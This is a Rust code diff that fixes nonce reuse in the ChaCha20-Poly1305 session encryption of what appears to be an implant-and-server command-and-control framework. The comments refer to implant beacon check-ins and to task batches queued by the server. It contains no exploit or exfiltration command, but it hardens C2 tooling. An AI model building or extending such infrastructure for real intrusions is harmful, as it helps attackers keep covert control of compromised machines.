@@ -117,28 +117,89 @@ pub fn derive_session_key(
     okm
 }
 
-/// AEAD-encrypt `plaintext` under `key` with a counter-derived nonce.
-/// `aad` is authenticated but not encrypted (we bind the session pubkey).
-pub fn seal(key: &SessionKey, counter: u64, aad: &[u8], plaintext: &[u8]) -> Vec<u8> {
-    let cipher = ChaCha20Poly1305::new(chacha20poly1305::Key::from_slice(key));
+/// Which direction a frame travels. The session key is shared by both peers,
+/// so the two directions **must** use disjoint nonce spaces — otherwise an
+/// implant check-in sealed at counter=0 collides with the server reply sealed
+/// at send_counter=0 (identical key, nonce, and AAD = the implant pubkey),
+/// which is a catastrophic ChaCha20-Poly1305 nonce reuse.
+///
+/// We separate the spaces by setting a fixed direction discriminator in the
+/// top byte of the 96-bit nonce (`nonce[0]`). The counter still occupies
+/// `nonce[4..12]`; bytes `[1..4]` stay zero. `ClientToServer` leaves the
+/// discriminator at 0 (preserving the historical implant→server nonce); the
+/// server→implant direction flips bit 0 of the top byte.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum Direction {
+    /// Implant → server (beacon check-ins + task responses).
+    ClientToServer,
+    /// Server → implant (queued-task batches).
+    ServerToClient,
+}
+
+impl Direction {
+    /// The discriminator written into `nonce[0]` to keep the two directions'
+    /// nonce spaces disjoint for every counter value.
+    const fn discriminator(self) -> u8 {
+        match self {
+            Direction::ClientToServer => 0x00,
+            Direction::ServerToClient => 0x01,
+        }
+    }
+}
+
+/// Build the 96-bit nonce for a given direction + counter.
+fn nonce_for(dir: Direction, counter: u64) -> [u8; NONCE_LEN] {
     let mut nonce_bytes = [0u8; NONCE_LEN];
+    nonce_bytes[0] = dir.discriminator();
     nonce_bytes[4..12].copy_from_slice(&counter.to_le_bytes());
+    nonce_bytes
+}
+
+/// AEAD-encrypt `plaintext` under `key` with a direction- and counter-derived
+/// nonce. `aad` is authenticated but not encrypted (we bind the session pubkey).
+pub fn seal_dir(
+    key: &SessionKey,
+    dir: Direction,
+    counter: u64,
+    aad: &[u8],
+    plaintext: &[u8],
+) -> Vec<u8> {
+    let cipher = ChaCha20Poly1305::new(chacha20poly1305::Key::from_slice(key));
+    let nonce_bytes = nonce_for(dir, counter);
     let nonce = Nonce::from_slice(&nonce_bytes);
     cipher
         .encrypt(nonce, Payload { msg: plaintext, aad })
         .expect("chacha20poly1305 encrypt is infallible")
 }
 
-/// AEAD-decrypt `ciphertext`. Returns `Err` on tag mismatch (tampering / wrong key).
+/// AEAD-decrypt `ciphertext`. Returns `Err` on tag mismatch (tampering / wrong
+/// key / wrong direction / wrong counter).
+pub fn open_dir(
+    key: &SessionKey,
+    dir: Direction,
+    counter: u64,
+    aad: &[u8],
+    ciphertext: &[u8],
+) -> Result<Vec<u8>, chacha20poly1305::Error> {
+    let cipher = ChaCha20Poly1305::new(chacha20poly1305::Key::from_slice(key));
+    let nonce_bytes = nonce_for(dir, counter);
+    let nonce = Nonce::from_slice(&nonce_bytes);
+    cipher.decrypt(nonce, Payload { msg: ciphertext, aad })
+}
+
+/// Back-compat shim: seals with [`Direction::ClientToServer`]. Prefer
+/// [`seal_dir`] for new call sites so the direction is explicit.
+pub fn seal(key: &SessionKey, counter: u64, aad: &[u8], plaintext: &[u8]) -> Vec<u8> {
+    seal_dir(key, Direction::ClientToServer, counter, aad, plaintext)
+}
+
+/// Back-compat shim: opens with [`Direction::ClientToServer`]. Prefer
+/// [`open_dir`] for new call sites so the direction is explicit.
 pub fn open(
     key: &SessionKey,
     counter: u64,
     aad: &[u8],
     ciphertext: &[u8],
 ) -> Result<Vec<u8>, chacha20poly1305::Error> {
-    let cipher = ChaCha20Poly1305::new(chacha20poly1305::Key::from_slice(key));
-    let mut nonce_bytes = [0u8; NONCE_LEN];
-    nonce_bytes[4..12].copy_from_slice(&counter.to_le_bytes());
-    let nonce = Nonce::from_slice(&nonce_bytes);
-    cipher.decrypt(nonce, Payload { msg: ciphertext, aad })
+    open_dir(key, Direction::ClientToServer, counter, aad, ciphertext)
 }
